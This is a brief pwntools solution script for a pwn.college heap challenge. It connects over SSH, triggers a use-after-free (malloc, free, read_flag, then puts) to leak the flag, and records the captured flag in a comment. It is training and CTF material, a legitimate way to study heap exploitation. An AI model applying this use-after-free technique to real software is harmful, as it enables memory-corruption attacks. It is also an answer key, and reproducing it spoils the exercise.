from pwn import *
from pwn import *

s = ssh(host="dojo.pwn.college", user="hacker", keyfile="~/key")
io = s.process("/challenge/babyheap_level1.0")

io.sendlineafter(b": ", b"malloc")
io.sendlineafter(b"Size: ", b"689")
io.sendlineafter(b": ", b"free")
io.sendlineafter(b": ", b"read_flag")
io.sendlineafter(b": ", b"puts")

io.recvuntil(b'Data: ')
flag = io.recvline().decode()
s.close()

info("Flag: " + flag)
# Flag: pwn.college{QkTZZp08Efae-qoSNijig7VZOdA.0VM3MDLxIjNyEzW}